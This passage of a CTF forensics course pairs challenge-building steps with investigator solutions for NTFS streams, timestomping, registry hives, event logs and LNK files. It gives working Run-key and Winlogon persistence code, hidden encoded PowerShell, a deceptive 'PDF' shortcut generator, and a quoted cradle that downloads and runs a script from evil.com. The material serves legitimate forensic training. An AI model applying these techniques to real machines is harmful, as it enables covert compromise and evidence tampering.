The Artifact: An NTFS disk image evidence.dd.

The Clue: The suspect downloaded a file named invoice.exe but claims they never ran it.

The Analysis:

1. The investigator parses the `$MFT`.
    
2. They locate the record for `invoice.exe`.
    
3. They identify two `$DATA (0x80)` attributes.
    
    - Stream 1: The executable code.
        
    - Stream 2: A named stream `Zone.Identifier`.
        
4. Extracting the `Zone.Identifier` stream reveals text content: `[ZoneTransfer] ZoneId=3`.
    
5. **The Flag:** The flag is hidden in a _third_, manually created ADS named `invoice.exe:flag` which contains the text `flag{hidden_in_plain_sight}`. Standard execution would verify the file is from the internet (ZoneId=3), but forensic parsing reveals the hidden payload.
    

#### 4. Key Tools

- **MFTECmd (Eric Zimmerman):** The industry standard for parsing `$MFT` files into readable CSVs. It automatically parses ADS and flags anomalies.
    
    - `MFTECmd.exe -f $MFT --csv "c:\temp\out"`
        
- **MFTExplorer:** A GUI viewer for the MFT that allows you to browse the file structure as it existed, including deleted files and ADS.
    
- **The Sleuth Kit (TSK):** `istat` can be used to display the MFT entry details for a specific inode (MFT Record Number).
    
    - `istat -o <offset> image.dd <inode_num>`

---

### Timeline analysis and detecting timestomping discrepancies

#### 1. Technical Theory

Timeline analysis involves constructing a chronological sequence of system activity to reconstruct events. In NTFS forensics, detecting timestomping relies heavily on analyzing the **Master File Table (MFT)** attributes.

- **The Two-Attribute Problem:** NTFS records timestamps in two distinct attributes within an MFT record:
    
    1. **$STANDARD_INFORMATION ($SI):** Stores Created, Modified, Accessed, and MFT Entry Modified (MACE) times. These are displayed by the OS and are easily modified by user-level tools (like PowerShell or `touch`).
        
    2. **$FILE_NAME ($FN):** Also stores MACE times. These are updated by the Windows Kernel and are generally _not_ modified by standard user-level API calls.
        
- **The Detection Vector:** When an attacker uses a standard tool to "timestomp" a file (e.g., backdating malware to look like a system file from 2015), they usually only update the **$SI** attributes. The **$FN** attributes retain the actual time the file was created on the disk.
    
- **Anomaly:** A file where the $SI Creation time is significantly _older_ than the $FN Creation time is a primary indicator of timestomping.
    

#### 2. Practical Implementation (The "How-To")

As **The Investigator**, your objective is to extract the MFT record of a suspicious file and compare the attribute sets.

Method A: Targeted Analysis with The Sleuth Kit (istat)

If you have a specific suspicious file (or its inode/MFT reference number), istat is the most direct way to view the raw attributes.

Bash

```
# 1. Find the inode of the suspicious file
fls -r -m / image.dd | grep "suspicious_file.exe"
# Output might be: 0|suspicious_file.exe|56432|... (56432 is the inode)

# 2. Display the MFT stats for that inode
istat -f ntfs -i raw image.dd 56432
```

Output Analysis:

Look for the two sections:

- `$STANDARD_INFORMATION Attribute Values:` -> Shows the fake date (e.g., 2018).
    
- `$FILE_NAME Attribute Values:` -> Shows the real date (e.g., 2024).
    

Method B: Bulk Analysis with AnalyzeMFT

If you need to hunt for timestomping across the entire drive without a specific target, use a parser that can export the MFT to a CSV for sorting.

Bash

```
# 1. Extract the $MFT file from the image (using icat from Sleuth Kit)
icat -f ntfs -i raw image.dd 0 > extracted_mft.bin

# 2. Parse the MFT using AnalyzeMFT (Python)
# This script often includes a check for "$SI < $FN" anomalies
python3 analyzeMFT.py -f extracted_mft.bin -o mft_timeline.csv -e

# 3. Analysis (grep or open in Spreadsheet)
# Look for rows where the "Notes/Anomaly" column indicates a mismatch.
```

Method C: Super Timeline Creation (Plaso)

For a holistic view, generating a super timeline allows you to see the file creation in context with other system events (like Event Logs).

Bash

```
# Generate the plaso storage file
log2timeline.py case_timeline.plaso image.dd

# Filter and export to CSV
psort.py -o l2tcsv -w full_timeline.csv case_timeline.plaso
```

#### 3. Example Scenario

**Scenario Title:** "The Ghost in the Shell"

Description:

You are investigating a persistence mechanism. You find a file C:\Windows\System32\health_check.exe.

- **Explorer View:** Creation Date: 01/01/2019 (Matches OS install).
    
- **The Flag:** The flag is the _actual_ creation timestamp of this file.
    

**The Solution:**

1. You run `istat` on the file's MFT entry.
    
2. **$SI** shows: `2019-01-01 10:00:00` (The fake time).
    
3. **$FN** shows: `2023-11-22 14:45:12` (The real time).
    
4. The discrepancy confirms timestomping. The flag is `CTF{2023-11-22_14:45:12}`.
    

#### 4. Key Tools

- **The Sleuth Kit (TSK):** specifically `istat` for deep-diving into single file attributes.
    
- **AnalyzeMFT:** A Python tool specifically designed to parse MFTs and highlight timestamp anomalies.
    
- **Timeline Explorer:** A GUI tool by Eric Zimmerman (Windows) optimized for viewing massive CSV timelines (like those from Plaso) and filtering for anomalies.
    
- **Plaso (log2timeline):** The industry standard for generating super timelines.
    
- [13Cubed: NTFS Timestamps and Timestomping](https://www.google.com/search?q=https://www.youtube.com/watch%3Fv%3DxT57dI-zXKQ)
    
    - _Note: This video provides an excellent visual guide on $SI vs $FN attributes._


# Module 6: Operating System Artifacts (Windows)

## The Architect (Creation)

### Modifying Registry keys to simulate persistence

#### 1. Technical Theory

The Windows Registry is a hierarchical database that stores low-level settings for the operating system and applications. "Persistence" refers to techniques used by malware (or CTF architects) to ensure a program executes automatically when the computer boots or a user logs in.

The most common targets for this are **Auto-Start Extensibility Points (ASEPs)**. The Operating System is hardcoded to check specific registry paths during the boot/login process. If an entry exists in these paths, Windows executes the command defined in the data field.

- **HKCU vs. HKLM:** Keys in `HKEY_CURRENT_USER` (HKCU) affect only the logged-in user (common in CTFs as it doesn't require Admin rights), while `HKEY_LOCAL_MACHINE` (HKLM) affects the entire system.
    
- **Standard Keys:** The most notorious keys are the `Run` and `RunOnce` keys.
    
- **Advanced Keys:** Persistence can also be achieved via `Winlogon` (hijacking the Shell or Userinit values) or `Image File Execution Options` (IFEO).
    

#### 2. Practical Implementation (The "How-To")

To create a registry persistence challenge, you must inject a key-value pair that points to your "malicious" payload (the flag or the script that generates the flag).

Method A: Command Line (reg.exe)

This is the fastest way to deploy persistence in a VM or script a setup.

Code snippet

```
:: Syntax: reg add <KeyPath> /v <ValueName> /t <Type> /d <Data> /f

:: 1. Standard Persistence (Run Key)
:: Adds an entry named "DiscordUpdater" that runs a script on login
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "DiscordUpdater" /t REG_SZ /d "C:\Users\Public\flag_generator.exe" /f

:: 2. Winlogon Hijacking (Advanced)
:: Modifies the Shell to run Explorer AND a malicious script. 
:: CAUTION: Can break the VM GUI if syntax is wrong.
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell" /t REG_SZ /d "explorer.exe, C:\Windows\Temp\backdoor.bat" /f
```

Method B: Python (winreg module)

Using Python allows for dynamic key creation, suitable for deployment scripts that need to determine the current user's path automatically.

Python

```
import winreg
import os

def install_persistence():
    # Path to the executable or script you want to run
    payload_path = r"C:\Users\Public\hidden_flag.py"
    
    # The Registry Key to modify (HKCU Run Key)
    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    
    try:
        # Open the key with write privileges
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
        
        # Set the value
        # "SecurityHealthCheck" is the misleading name visible in the Registry
        winreg.SetValueEx(key, "SecurityHealthCheck", 0, winreg.REG_SZ, payload_path)
        
        winreg.CloseKey(key)
        print(f"[+] Persistence established at {key_path}")
        
    except PermissionError:
        print("[-] Admin privileges required for this key.")
    except Exception as e:
        print(f"[-] Error: {e}")

# usage
install_persistence()
```

Method C: PowerShell (Fileless Persistence)

Instead of pointing to a file, you can store the malicious code directly in the registry value using PowerShell. This is a "Fileless" technique.

PowerShell

```
# Creates a Run key that executes a base64 encoded command directly from memory
$command = "Write-Host 'FLAG{registry_is_persistent}'; Start-Sleep 100"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encoded = [Convert]::ToBase64String($bytes)

$payload = "powershell.exe -nop -w hidden -enc $encoded"

New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "OneDriveSync" -Value $payload -PropertyType String -Force
```

#### 3. Example Scenario

Scenario Name: "The Silent Startup"

Description: A user reports that their computer slows down immediately after logging in, even though their "Startup" folder in the Start Menu is empty.

The Setup:

1. The Architect uses **Method C** to inject a PowerShell encoded command into `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`.
    
2. The entry is named `CortanaHelper` to look legitimate.
    
3. The Base64 payload, when decoded, simply prints the flag or downloads it from a local server.
    
    Solution Path: The investigator must check the Registry (using regedit or Autoruns), identify the suspicious CortanaHelper entry, recognize the PowerShell -enc parameter, and decode the Base64 string to retrieve the flag.
    

#### 4. Key Tools

- **reg.exe:** The native Windows command-line tool for registry manipulation.
    
- **PowerShell:** Used for creating advanced, fileless persistence entries.
    
- **Python (winreg):** Ideal for scripting the environment setup and automating the injection of multiple keys.


---

### Generating specific Event IDs (Logon/Logoff, USB insertion)

#### 1. Technical Theory

Windows Event Logs are the primary audit trail for the operating system, stored in binary XML format (`.evtx`) located in `C:\Windows\System32\winevt\Logs`.

- **Structure:** Each event contains a `System` header (Provider, EventID, TimeCreated) and `EventData` (variable strings like Username, IP Address, Device ID).
    
- **Key Event IDs:**
    
    - **4624:** Successful Logon (Security Log). Important types: Type 2 (Interactive), Type 3 (Network), Type 10 (RDP).
        
    - **4625:** Failed Logon (Security Log).
        
    - **20001 / 20003:** Driver installation/device recognition (Microsoft-Windows-DriverFrameworks-UserMode).
        
    - **6416:** External device recognized (Security Log - Audit Other Object Access Events).
        
- **Key Constraints:** The **Security** log is protected. Standard users (and even Admins using standard APIs) cannot simply "write" a fake Event ID 4624 with arbitrary data into the Security log to frame someone. The OS controls this stream. To create these artifacts for a CTF, you usually must **perform the action** (actually log in) or manipulate the `.evtx` file binary directly after capture.
    

#### 2. Practical Implementation (The "How-To")

**Perspective: The Architect (Creation)**

To build a challenge, you often need to flood logs with noise or generate specific "smoking gun" events.

Method 1: Generating Authentic Logon/Logoff Events (Python/Batch)

Since you cannot easily fake a Security Event 4624, the best way is to generate real traffic.

- **Scenario:** Create a "Brute Force" noise pattern followed by a successful login.
    
- **Script:** Uses the native `net use` command to generate Type 3 (Network) logons.
    

Python

```
import os
import time

def generate_logon_traffic(target_user, correct_password, attempts=10):
    print(f"[+] Generating {attempts} failed logins for user: {target_user}")
    
    # Generate Failed Logons (Event ID 4625)
    for i in range(attempts):
        # Attempt to connect to IPC$ with a bad password
        # This generates a Type 3 Logon Failure
        cmd = f"net use \\\\127.0.0.1\\IPC$ /user:{target_user} wrongpass_{i} >nul 2>&1"
        os.system(cmd)
        print(f"    [-] Failure {i+1} generated.")
        time.sleep(0.5)

    print(f"[+] Generating Successful Logon (Event ID 4624)")
    # Generate Successful Logon
    cmd = f"net use \\\\127.0.0.1\\IPC$ /user:{target_user} {correct_password} >nul 2>&1"
    os.system(cmd)
    print("    [+] Success generated.")
    
    # Clean up
    os.system("net use \\\\127.0.0.1\\IPC$ /delete >nul 2>&1")

if __name__ == "__main__":
    # Ensure this user exists on the system or is a domain user
    generate_logon_traffic("CTF_Target", "Password123!")
```

Method 2: Simulating USB Insertion (VHD Mounting)

Physical USB insertion triggers complex PnP events. You can simulate "Drive Insertion" events (like Event ID 7036 or Kernel-PnP 219) without physical hardware by mounting a Virtual Hard Disk (VHD) or ISO.

- **Command:**
    
    PowerShell
    
    ```
    # Mounts an ISO/VHD. Windows treats this as a Plug and Play storage device arrival.
    # This generates logs in System and DriverFrameworks similar to a USB drive.
    Mount-DiskImage -ImagePath "C:\CTF\Files\malware_transport.iso"
    
    # Wait for logs to populate...
    Start-Sleep -Seconds 5
    
    # Unmount (Simulates removal/unplug)
    Dismount-DiskImage -ImagePath "C:\CTF\Files\malware_transport.iso"
    ```
    

Method 3: Injecting Custom/Fake Events (PowerShell)

If you need to hide a flag in the text of a log, use Write-EventLog. Note: You generally cannot write to the 'Security' log this way, so use 'Application' or a custom log.

PowerShell

```
# Run as Administrator
# 1. Create a custom source (only needs to be done once)
New-EventLog -LogName Application -Source "CTF_Challenge_App"

# 2. Write a custom event
# EventId 1000 is generic, but you can set it to anything (e.g., 1337)
# The Message contains the flag.
Write-EventLog -LogName Application `
               -Source "CTF_Challenge_App" `
               -EventID 1337 `
               -EntryType Information `
               -Message "Service initialized. Configuration loaded from shadow volume. Key: CTF{Ev3nt_L0gs_T3ll_St0r13s}"

Write-Host "Event Injected."
```

#### 3. Example Scenario

Title: The After-Hours Intruder

Scenario: Management suspects an employee accessed the server room at 3:00 AM. The employee claims they were home.

The Artifact: A Security.evtx file extracted from the server.

The Analysis:

1. The investigator filters for **Event ID 4624** (Logon).
    
2. They find a Type 2 (Interactive) logon at 03:00:00 AM for user "JSmith".
    
3. Immediately following this, **Event ID 6416** (External device recognized) or **System Event 7036** ("The Portable Device Enumerator Service entered the running state") appears.
    
4. The "Device Name" in the event data contains the Volume Serial Number `ABCD-1234`.
    
5. **The Flag:** The flag is the Volume Serial Number found in the USB insertion log.
    

#### 4. Key Tools

- **Logman / Auditpol:** Built-in Windows tools to configure _what_ gets logged. If Audit Policy is off, no 4624s will be generated.
    
- **Python-evtx (Willi Ballenthin):** A powerful library if you want to programmatically parse or _modify_ the binary structure of an .evtx file (advanced artifact forgery).
    
- **Event Viewer (GUI) / Get-WinEvent (PowerShell):** The standard tools for viewing and filtering the results of your generation.

---

### Creating misleading LNK (shortcut) files.

#### 1. Technical Theory

Windows Shortcut files (`.lnk`) adhere to the **Shell Link Binary File Format**. While they appear to be simple pointers to files, they are complex binary containers storing:

- **Shell Item ID List (PIDL):** The path to the target object.
    
- **LinkInfo:** Details about the volume and local path where the target was stored.
    
- **String Data:** Relative path, working directory, command line arguments, and icon location.
    
- **Extra Data Blocks:** Console properties, tracker data (NetBIOS name of the machine that created it), and environmental variables.
    

**The Deception:** A "misleading" LNK exploits the separation between the **Target Application** and the **Visual Metadata** (Icon/Description).

1. **Extension Hiding:** Windows hides the `.lnk` extension by default. A file named `Report.pdf.lnk` appears simply as `Report.pdf`.
    
2. **Icon Spoofing:** The LNK header specifies an icon location (`IconLocation`). This can be set to a system DLL (like `shell32.dll`) to mimic a folder, PDF, or image icon, masking the actual executable target.
    
3. **Argument Injection:** The `Target` can be a legitimate binary (e.g., `powershell.exe`), while the malicious payload resides entirely in the `Arguments` field.
    

#### 2. Practical Implementation (Creation)

To create a forensic challenge, we need to programmatically generate a LNK that looks innocent but executes a specific payload (the flag or a generator for the flag). The most reliable method is using Python with the `pywin32` library on a Windows host, as constructing the Shell Item ID List from scratch in raw bytes is prone to corruption.

Method 1: The "Trojan" PDF (Python + win32com)

This script creates a shortcut that looks like a PDF document but actually executes a hidden PowerShell command to reconstruct the flag.

**Prerequisite:** `pip install pywin32` (Must be run on Windows).

Python

```
import win32com.client
import os

def create_deceptive_lnk(filename, hidden_payload, spoof_icon_idx):
    shell = win32com.client.Dispatch("WScript.Shell")
    
    # Get absolute path for the LNK
    lnk_path = os.path.abspath(filename)
    
    shortcut = shell.CreateShortcut(lnk_path)
    
    # 1. The Actual Target: PowerShell (legitimate system tool)
    shortcut.TargetPath = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
    
    # 2. The Payload: Hidden in arguments
    # WindowStyle 7 = Minimized/Hidden
    # The payload effectively prints the flag to a file or displays it
    shortcut.Arguments = f"-NoProfile -WindowStyle Hidden -Command \"{hidden_payload}\""
    
    # 3. The Description: A red herring for the properties tab
    shortcut.Description = "Quarterly Financial Report 2024"
    
    # 4. The Deception: Set Icon to a generic document icon
    # imageres.dll, index 15 is often a document icon (varies by OS version)
    # shell32.dll, index 3 is a Folder icon
    shortcut.IconLocation = r"C:\Windows\System32\imageres.dll," + str(spoof_icon_idx)
    
    # 5. Working Directory: Often used to check for 'start in' artifacts
    shortcut.WorkingDirectory = r"C:\Users\Public"
    
    shortcut.Save()
    print(f"Generated deceptive LNK: {lnk_path}")

# Define a payload that looks encoded
payload = "Write-Output 'flag{LNK_argum3nts_c4n_k1ll}'; Start-Sleep -Seconds 10"

# Create 'scan.pdf.lnk' (The .lnk is hidden by Windows Explorer)
# Icon Index 15 in imageres.dll is typically a generic file/text icon
create_deceptive_lnk("scan.pdf.lnk", payload, 15)
```

Method 2: "Time Stomping" via Hex Editing

Investigators look at the creation time of the LNK to determine when a file was opened. You can modify the raw bytes to spoof this.

1. Open the generated `.lnk` in a Hex Editor (like HxD).
    
2. The header is 76 bytes (`0x4C`).
    
3. **Offsets 0x1C - 0x23:** Creation Time (FILETIME format - 8 bytes).
    
4. **Offsets 0x24 - 0x2B:** Access Time.
    
5. **Offsets 0x2C - 0x33:** Write Time.
    
6. Replace these bytes with random data or a specific FILETIME hex value to break timeline analysis tools.
    

#### 3. Example Scenario

Challenge Name: "The Click Bait"

Scenario: An employee claims they just opened a folder on their desktop, but their machine immediately started beaconing to a suspicious IP.

The Artifact: A file named DCIM_Backup which appears to have a standard Folder icon.

Analysis:

1. The investigator checks the extension: it is `DCIM_Backup.lnk`.
    
2. They parse the LNK with `LECmd`.
    
3. **Target:** `C:\Windows\System32\cmd.exe`.
    
4. **Arguments:** `/c powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')"`
    
5. **Icon Location:** `%SystemRoot%\system32\SHELL32.dll,3` (This sets the visual icon to the standard Windows directory folder).
    
6. **The Flag:** The flag is the domain name found in the arguments field (`flag{evil.com}`).
    

#### 4. Key Tools

1. **LnkGen:** A specialized command-line tool (often found in GitHub repositories for Red Teaming) designed specifically to craft weaponized LNK files with path obfuscation and icon spoofing.
    
2. **Windows Script Host (WScript.Shell):** The native Windows COM object used in Python (via `pywin32`) or VBScript to create valid shell links programmatically.
    
3. **HxD (Hex Editor):** Essential for manual manipulation of LNK headers, such as modifying the `LinkFlags` to hide the presence of command-line arguments from basic parsers or "time stomping" the internal timestamps.

---

### Simulating Recent Docs and Shellbag activity

#### 1. Technical Theory

Windows operating systems aggressively track user activity to improve usability. Two of the most critical forensic artifacts are:

- **Recent Docs (LNK Files & Jump Lists):** When a user opens a file, Windows creates a shortcut (`.lnk`) in `%APPDATA%\Microsoft\Windows\Recent`. This file contains metadata about the target file, including its original path, size, and timestamps (Created/Modified/Accessed), even if the target file is on a removable drive that is no longer connected.
    
- **Shellbags:** These are registry keys stored in `NTUSER.DAT` and `UsrClass.dat` that track folder display preferences (e.g., window position, icon size). Critically, **Shellbags persist even after the folder is deleted**. They provide proof that a specific directory existed and was viewed by the user.
    

**Key Constraints:** Shellbags are binary blobs (specifically `ITEMIDLIST` structures) stored in the Registry. Manually editing the hex to create a fake entry is extremely prone to corruption; the most reliable method for CTF creation is to programmatically perform the file system actions that trigger Windows to generate the artifacts for you.

#### 2. Practical Implementation (The "How-To")

To create a believable timeline, we will script the creation of these artifacts.

Part A: Generating "Recent Docs" (LNK Files)

We can use the Windows Script Host (via Python or PowerShell) to create a LNK file that points to a "phantom" file (e.g., a file on a USB drive that isn't plugged in). This simulates evidence of data exfiltration.

_Python Script to plant a LNK file:_

Python

```
import os
import win32com.client # Requires: pip install pywin32

def create_phantom_lnk(target_path, lnk_name):
    """
    Creates a shortcut in the Recent folder pointing to a file that might not exist.
    """
    shell = win32com.client.Dispatch("WScript.Shell")
    
    # Get the path to the user's Recent folder
    recent_folder = shell.SpecialFolders("Recent")
    lnk_path = os.path.join(recent_folder, lnk_name + ".lnk")
    
    shortcut = shell.CreateShortcut(lnk_path)
    shortcut.TargetPath = target_path
    shortcut.WorkingDirectory = os.path.dirname(target_path)
    shortcut.Description = "Confidential Document"
    
    # Save the LNK file
    shortcut.Save()
    print(f"[+] Created phantom LNK at: {lnk_path}")
    print(f"[+] Points to: {target_path}")

# Example: Simulate accessing a file on a USB drive (Drive E:)
create_phantom_lnk(r"E:\Secret_Projects\Project_X\payload_specs.pdf", "payload_specs.pdf")
```

Part B: Generating Shellbags (The "Ghost Folder" Method)

To generate a valid Shellbag entry for a folder that doesn't exist (a classic forensic puzzle), we must create the folder, force Windows Explorer to index it, and then delete the folder.

_Batch/PowerShell Automation:_

PowerShell

```
# 1. Define the secret folder structure
$secretPath = "C:\Users\$env:USERNAME\Desktop\Hidden_Stash"

# 2. Create the directory
New-Item -ItemType Directory -Force -Path $secretPath

# 3. Open the folder in Explorer to trigger Shellbag creation
# The 'Invoke-Item' command launches the default handler (Explorer)
Invoke-Item $secretPath

# 4. Wait briefly to ensure the Registry updates (Shellbags write on window close or navigation)
Start-Sleep -Seconds 3

# 5. Kill the Explorer window to force the write (optional, or just close manually in a real test)
# In a script, we often just navigate away or assume the user closes it. 
# For this script, we rely on the fact it was opened.

# 6. DELETE the directory
Remove-Item -Recurse -Force $secretPath

Write-Host "Shellbag created. Folder deleted. Evidence remains in Registry."
```

Advanced Touch:

To manipulate the timestamps of when these folders were accessed (backdating), you cannot easily edit the registry binary. Instead, change the system clock (Set-Date) before running the scripts above, then restore the correct time.

#### 3. Example Scenario

Scenario Title: "The Vanishing Volume"

Context: Corporate espionage is suspected. The employee claims they never accessed any sensitive files on the server. A disk image of their laptop is provided.

Artifacts:

1. **LNK Analysis:** Parsing the `Recent` folder reveals `pricing_strategy_2025.xlsx.lnk`.
    
    - _Target Path:_ `F:\Backups\pricing_strategy_2025.xlsx`.
        
    - _Drive Type:_ Removable (Drive F: is not currently mounted).
        
2. **Shellbag Analysis:** Parsing `UsrClass.dat` reveals a Shellbag entry for `F:\Backups`.
    
    - Last Interacted: 2 days ago (matching the LNK timestamp).
        
        The Challenge: The physical file pricing_strategy_2025.xlsx does not exist on the laptop. The solver must use the LNK and Shellbag metadata to prove that an external drive was connected and the specific folder Backups was browsed by the user at a specific time, disproving the employee's alibi.
        

#### 4. Key Tools

- **LECmd (Zimmerman Tools):** The industry standard command-line tool for parsing LNK files with high precision.
    
- **ShellBags Explorer (Eric Zimmerman):** A GUI tool that visualizes Shellbag data, reconstructing the directory structure of folders that no longer exist.
    
- **SBECmd:** The command-line version of ShellBags Explorer, useful for exporting results to CSV for timeline analysis.

---


## The Investigator (Solution)

### Registry Hive parsing (NTUSER.DAT, SAM, SYSTEM)

#### 1. Technical Theory

The Windows Registry is not a single file but a collection of binary files called **Hives** stored on the disk. When the OS loads, it mounts these files into the logical tree structure (HKEY_LOCAL_MACHINE, etc.) seen in `regedit`.

For forensic analysis, investigators rarely analyze the live registry. Instead, they extract these hive files from a disk image and parse them offline. Each key in the registry has a "Last Write Time" timestamp, which functions similarly to a file modification timestamp, allowing investigators to build a timeline of user activity.

**Key Hives & Locations:**

- **SAM, SECURITY, SOFTWARE, SYSTEM:** Located in `C:\Windows\System32\config\`
    
    - _SAM:_ User accounts, group membership, login counts.
        
    - _SYSTEM:_ Timezone info, USB connections (`USBSTOR`), Computer Name.
        
    - _SOFTWARE:_ Installed programs, OS version.
        
- **NTUSER.DAT:** Located in `C:\Users\<Username>\` (Hidden file)
    
    - Contains user-specific settings: Recent files, UserAssist (execution history), ShellBags (folder browsing).
        
    - **Constraint:** Each user has their own `NTUSER.DAT`.
        

#### 2. Practical Implementation (The "How-To")

Analysis typically involves two stages: Extraction (getting the locked files) and Parsing (making sense of the binary data).

Stage 1: Offline Extraction

On a live system, hive files are locked by the kernel. You cannot copy them normally.

- **Tool:** FTK Imager (or similar).
    
- **Action:** "Export Files" from the evidence drive image.
    

Stage 2: Parsing with Eric Zimmerman's Registry Explorer (GUI)

This is the industry standard for deep manual analysis.

1. Open **Registry Explorer**.
    
2. Go to **File > Load Hive** and select the target hive (e.g., `NTUSER.DAT`).
    
3. **Recovering Deleted Keys:** If the tool detects "dirty" hives (transaction logs `.LOG1`, `.LOG2`), allow it to replay the logs. This often recovers deleted keys or recent changes not yet flushed to the main hive.
    
4. Navigate using the bookmark feature (Common Forensic Artifacts) to find specific data like "UserAssist" or "Run Keys".
    

Stage 3: Automated Parsing with RegRipper (CLI)

RegRipper runs "plugins" against specific hives to extract text-based reports of common artifacts.

Bash

```
# Syntax: rip.pl -r <hive_file> -f <hive_type> > <output_report.txt>

# Analyze the SAM hive to list users and groups
rip.pl -r SAM -f sam > sam_report.txt

# Analyze the SYSTEM hive for USB history and Timezone
rip.pl -r SYSTEM -f system > system_report.txt

# Analyze a specific user's activity (Recent docs, Execution)
rip.pl -r NTUSER.DAT -f ntuser > user_activity.txt
```

**Stage 4: Specific Artifact Hunting (Manual)**

- **Identifying USB Devices (SYSTEM):**
    
    - Path: `ROOT\ControlSet001\Enum\USBSTOR`
        
    - Value: Shows Vendor, Product, and Serial Number of every USB device ever connected.
        
- **Identifying Executed Programs (NTUSER.DAT):**
    
    - Path: `Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\{GUID}\Count`
        
    - Note: The program names are ROT13 encoded. Tools like Registry Explorer decode this automatically.
        
- **Identifying Folder Access (NTUSER.DAT):**
    
    - Path: `Software\Microsoft\Windows\Shell\Bags` & `BagMRU`
        
    - Artifact: **ShellBags**. Proves a user opened/viewed a specific folder, even if that folder no longer exists.
        

#### 3. Example Scenario

Scenario Name: "The Rogue Employee"

Description: Management suspects an employee, "J.Doe," accessed a restricted folder named \Confidential\Salaries on a USB drive and then deleted the evidence.

The Evidence: A disk image of J.Doe's laptop.

Analysis Path:

1. **Extract:** The investigator extracts `C:\Users\JDoe\NTUSER.DAT` and `C:\Windows\System32\config\SYSTEM`.
    
2. **USB Analysis (SYSTEM):** Uses `Registry Explorer` on the `SYSTEM` hive to check `USBSTOR`. Finds a USB drive with Serial Number `1234ABCD` connected at 14:00.
    
3. **Folder Access (NTUSER):** Uses `ShellBags Explorer` (or manual Registry Explorer parsing) on `NTUSER.DAT`. Locates an entry for `E:\Confidential\Salaries` inside the `BagMRU` key.
    
4. **Correlation:** The timestamp on the ShellBag entry matches the connection time of the USB drive.
    
5. **Flag:** `FLAG{USB_1234ABCD_Salaries_Confirmed}`.
    

#### 4. Key Tools

- **Registry Explorer / RECmd:** Eric Zimmerman's tools. Best for visual navigation and deleted key recovery.
    
- **RegRipper:** Excellent for quick, text-based triage reports.
    
- **ShellBags Explorer:** Specialized tool specifically for parsing the complex `BagMRU` structure in `NTUSER.DAT`.

---

### LNK file metadata analysis and target path recovery

#### 1. Technical Theory

The forensic analysis of Windows Shortcut files (`.lnk`) is critical for reconstructing user activity and identifying malicious execution chains. An investigator must understand that the file's **visual appearance** (icon, name) is easily spoofed and has no bearing on its **actual execution target**.

- **Forensic Focus:** The crucial information is stored in the binary file structure:
    
    - **LinkFlags:** Determines which optional structures (like the `Extra Data Blocks` and `String Data`) are present. Flags like `HasLinkInfo` and `HasArguments` must be present for a complete analysis.
        
    - **Arguments:** This field is often the execution payload when the `TargetPath` is a trusted, generic binary like `powershell.exe` or `cmd.exe`.
        
    - **Timestamps:** The creation/access/write times in the LNK file itself often reflect when the _shortcut_ was created, not when the target file was opened. These must be cross-referenced with the **MFT record** times of the LNK file and the **Windows Event Logs** to establish a true timeline.
        

**The Solution:** The investigator must bypass the OS's visual interpretation and use dedicated parsers to extract all metadata fields, particularly the `TargetPath`, `Arguments`, and `IconLocation`, to uncover the deception.

#### 2. Practical Implementation (The "How-To")

The primary solution for LNK analysis involves specialized parsers to reliably navigate the complex binary structure and extract the fields that reveal the actual execution path.

Method 1: Command Line Parsing with LECmd (Eric Zimmerman)

LECmd is the gold standard for LNK analysis, parsing all fields and outputting to a timeline-friendly format (CSV).

Bash

```
# Assuming the LNK file is found at 'evidence\scan.pdf.lnk'

# 1. Run LECmd to parse the LNK file and output the results
# -f : specifies the target file
# -csv : specifies the output folder for the CSV report
# -nl : tells the tool to NOT output the file path in the output (cleaner CSV)
LECmd.exe -f "C:\evidence\scan.pdf.lnk" -csv "C:\results\lnk_analysis" -nl

# 2. Review the resulting CSV file (scan.pdf.lnk.csv)
# Look specifically at these columns:
# - TargetPath: Should show the actual binary (e.g., powershell.exe)
# - Arguments: Will contain the malicious command (the flag or payload)
# - IconLocation: Reveals the deceptive icon path (e.g., imageres.dll,15)
```

Method 2: Identifying the Hidden Payload via Arguments

Once the Arguments field is extracted, the investigator must analyze the command structure for typical obfuscation techniques.

PowerShell

```
# Extracted Argument: -NoProfile -WindowStyle Hidden -Command "Write-Output 'flag{LNK_argum3nts_c4n_k1ll}'; Start-Sleep -Seconds 10"

# Step 1: Isolate the final command string
ENCODED_COMMAND="Write-Output 'flag{LNK_argum3nts_c4n_k1ll}'; Start-Sleep -Seconds 10"

# Step 2: If the command is Base64 encoded (common attacker technique), use PowerShell to decode it
# Example if the command was: powershell.exe -e JABjACAAPQAgACcAd...
# Run the following in a sterile PowerShell session for safety:
# [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("BASE64_STRING"))
```

Method 3: Timestamp Verification (Detecting Stomping)

To detect time stomping, the investigator must compare the three main timestamps:

1. **LNK Internal Timestamps:** Extracted by `LECmd` (these are easily spoofed).
    
2. **LNK File MFT Timestamps:** The operating system's record of when the LNK file itself was created/modified (read from the disk image using tools like `MFTECmd`).
    
3. **Related Artifacts:** `shellbags` or `JumpLists` creation/access times pointing to the same file.
    

A significant discrepancy between the LNK's internal timestamps and its MFT timestamps is definitive proof of artifact tampering.

#### 3. Example Scenario

Challenge Name: "The Click Bait" (Solution)

Context: An employee executed a file named DCIM_Backup (which visually looked like a folder). Network logs show an outbound connection to evil.com. The investigator has the LNK file.

Solution Steps:

1. **Parsing:** The investigator runs `LECmd` on `DCIM_Backup.lnk`.
    
2. **Deception Revealed:** The `IconLocation` field shows `%SystemRoot%\system32\SHELL32.dll,3`, confirming the icon was spoofed to look like a folder.
    
3. **Payload Extraction:** The `Arguments` field contains the crucial command: `/c powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')"`
    
4. **Flag Recovery:** The flag is the critical data point within the execution chain. The investigator identifies the domain name used for the beaconing command, **`evil.com`**, as the flag.
    

#### 4. Key Tools

